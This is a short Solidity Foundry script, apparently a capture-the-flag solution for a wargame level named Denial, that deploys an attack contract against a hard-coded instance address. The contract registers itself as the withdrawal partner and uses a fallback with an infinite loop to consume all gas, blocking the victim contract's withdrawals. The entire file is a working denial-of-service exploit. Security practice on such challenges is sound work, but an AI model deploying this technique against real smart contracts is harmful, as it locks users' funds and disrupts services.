// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Denial} from "../src/Level20.sol";

contract Level20Sol is Script{
    Denial public instance = Denial(payable(0x222eE4906Ab1064Af1c66ccA78c71F9a47b18EAE));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Hack().exploit();
        vm.stopBroadcast();
    }
}

contract Hack{
        Denial public instance = Denial(payable(0x222eE4906Ab1064Af1c66ccA78c71F9a47b18EAE));
        function exploit() public{
            instance.setWithdrawPartner(address(this));
        }
        fallback() external payable{
            //draining the entire gas with infinite loop
            uint i = 0;
            while (i < 10) {}
        }
}